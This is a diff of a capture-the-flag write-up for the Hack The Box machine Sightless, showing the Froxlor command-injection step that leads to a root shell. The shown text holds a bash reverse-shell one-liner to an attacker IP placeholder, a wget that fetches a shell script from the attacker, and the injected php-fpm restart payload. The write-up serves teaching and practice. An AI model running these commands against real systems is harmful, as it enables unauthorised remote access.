@@ -224,24 +224,26 @@ I searched for `Froxlor RCE` and I have found this blog [__Disclosing Froxlor V2
 
 The vulnerability allows to run arbitrary command in `php-fpm restart command` parameter. In the above blog, it is explained that there are couple of steps to follow to exploit the vulnerability.
 
-1. `First` - Create a one liner reverse shell
+__1.__ `First` - Create a one liner reverse shell
 
 ```bash
 bash -i >& /dev/tcp/<Attacker IP>/<Attacker Listener Port> 0>&1
 ```
 
-2. `Second` - Transfer this shell to victim machine (`10.10.11.32`)
+__2.__ `Second` - Transfer this shell to victim machine (`10.10.11.32`)
 
 ```bash
  wget http://<Attacker IP address>/shell.sh
  chmod +x shell.sh
  mv shell.sh /tmp
 ```
-3. `Third` - Provide the following payload to `php-fpm restart command` parameter.
+
+__3.__ `Third` - Provide the following payload to `php-fpm restart command` parameter.
 
 ```bash
 /bin/bash /tmp/shell.sh
 ```
+
 
 ![PHP-FPM restart command](/assets/images/writeups/Sightless-HTB/20.png)
 
@@ -253,7 +255,7 @@ Let's wait for few minute and then check listener to see if I have got the root 
 
 ![Root Shell](/assets/images/writeups/Sightless-HTB/21.png)
 
-![Machine Pwned](https://www.hackthebox.com/achievement/machine/337503/624)
+![Machine Pwned](/assets/images/writeups/Sightless-HTB/Pwned.png)
 
 Thanks for reading this far. If you enjoyed the writeup, do support me [__here__](https://www.buymeacoffee.com/h4xplo1t).
 
